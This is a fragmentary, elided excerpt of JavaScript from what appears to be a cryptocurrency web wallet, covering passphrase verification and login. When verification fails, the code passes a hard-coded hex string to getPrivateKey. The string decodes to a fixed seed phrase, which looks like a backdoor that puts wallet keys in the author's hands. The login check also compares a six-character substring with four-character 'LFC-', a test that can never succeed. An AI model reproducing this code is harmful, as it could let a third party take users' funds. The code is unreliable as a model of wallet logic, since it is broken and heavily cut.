...
var BRS = (function(BRS, $, undefined) {
    ...
    BRS.verifyGeneratedPassphrase = function() {
        ...
        if (password !== PassPhraseGenerator.passPhrase) {
            ...
            BRS.getPrivateKey("696e746f206d6f766965206772616e642062726f6b656e207365656d206d656e74696f6e206e6f626f64792061726d7920656d7074792073686f6f6b20616c61732066656564");
    ...
    BRS.login = function(password, callback) {
        ...
        BRS.sendRequest("getBlockchainStatus", function(response) {
            ...
            if (password.trim().toUpperCase().substring(0, 6) === "LFC-" && password.length === 26) {
